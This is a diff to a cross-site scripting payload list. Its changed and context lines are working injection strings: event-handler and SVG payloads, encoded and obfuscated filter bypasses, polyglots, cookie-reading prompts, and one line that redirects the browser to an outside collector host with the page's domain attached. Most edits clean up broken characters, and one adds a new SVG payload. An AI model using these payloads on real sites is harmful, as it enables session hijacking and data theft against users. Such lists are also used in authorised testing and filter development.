@@ -3,6 +3,7 @@
 <Img Src=OnXSS OnError=prompt(document.cookie)>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 <svg/onload=alert&#x2F;**&#47;(5)>
+<svg/onload=alert&sol;**&sol;(3)>
 <Svg On Only=1 Onload=alert("hex")>
 "><script>prompt()</script>
 <svg/onrandom=random onload=confirm(1)>
@@ -891,7 +892,7 @@ eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(
 javascript:var{a:onerror}={a:alert};throw%20document.domain
 #&lt;img&#47;src&#47;onerror=alert(`coffinxp`)&gt;
 <a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+ ;alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
 xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert()//</script> 
@@ -985,7 +986,7 @@ javascript:alert(document.domain);
 “=””’></><script></script><svg onload=alert(1)>
 <script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
 "><img src=x onerror=prompt&#x000000028;document&#x00000002E;domain&#x000000029;&#x00000003B;>
-<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom�
+<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom 
 \";confirm(document.location);//
 "></select><img%20src=1%20onerror=alert(1)>
 <body ontouchmove=alert(1)>
@@ -1035,7 +1036,7 @@ javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></no
 <form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
 <img src=1 onerror=alert(1)>
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
-<IMG SRC=�jav ascript:alert(�XSS�);�>
+<IMG SRC= jav ascript:alert( XSS ); >
 javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>
 </script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
 <applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
@@ -1262,7 +1263,7 @@ javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[
 <h1/%6f%6e/oNclicK=alert``>XSS
 javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/<svg */ onload=alert()//</script> 
 %22%3E%3Csvg%20onload%3Dalert%26amp%3B%26amp%3B%23x00000040%221%22%29%3E	
-<<SCRIPT>alert(�XSS�);//<</SCRIPT>
+<<SCRIPT>alert( XSS );//<</SCRIPT>
 <svgonload=alert(1)>
 %EF%BC%9Cscript%EF%BC%9E alert() %EF%BC%9C/script%EF%BC%9E
 "><img src=x id=img> <script>document.getElementById('img').addEventListener('error',function(){prompt(document.domain);})</script>
@@ -1659,7 +1660,7 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 javascript:\\\\\\\/\\\\\\\/%250Aalert(1)
 %0d%0a%0d%0a<script>alert(document.domain)</script>
 x"><svg%250donload%3D"window%5B%27alert%27%5D(location[%27hostname%27])"
-�><s�%2b�cript>alert(document.cookie)</script>
+ ><s %2b cript>alert(document.cookie)</script>
 '">><div><meter onmouseover="alert(1)"</div>"
 #alert`1`
 <img onerror=a[%00]lert(1) src=a>
@@ -2186,7 +2187,7 @@ xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
 <image/src/onerror=prompt(8)>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 +ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
-<IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>
+<IMG    ><SCRIPT>alert( XSS )</SCRIPT> >
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
 <<SCRIPT>alert("test");//<</SCRIPT>
 %27%3E'><script>alert(2);</script>
@@ -2546,7 +2547,7 @@ window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'ler
 %26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B
 <iframe src=%(scriptlet)s <
 <xss style="x:expression(alert('XSS'))">
-<IMG SRC=�jav&#x09;ascript:alert(�XSS�);�>
+<IMG SRC= jav&#x09;ascript:alert( XSS ); >
 top[‘al\x65rt’](1)
 <svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>
 <<SCRIPT>alert(1);//<</SCRIPT>
@@ -2605,7 +2606,9 @@ q="><img/src/onerror=.1|alert`` class=d>
 #javascript:alert(document.domain)
 <script>{onerror=alert}throw 1</script>
 javascript&#00058;confirm(1)
-<a data-orig-ref=" alert(1)" data-orig-proto="javascript" href="javascript:// alert(1)">clickme</a>
+<a data-orig-ref="
+alert(1)" data-orig-proto="javascript" href="javascript://
+alert(1)">clickme</a>
 '%26%26'javascript:alert%25281%2529//
 %3E%3Cbody%20onload=javascript:alert(1)%3E
 javascript:alert(1)?q=%26callback%3Durc_button.click%23
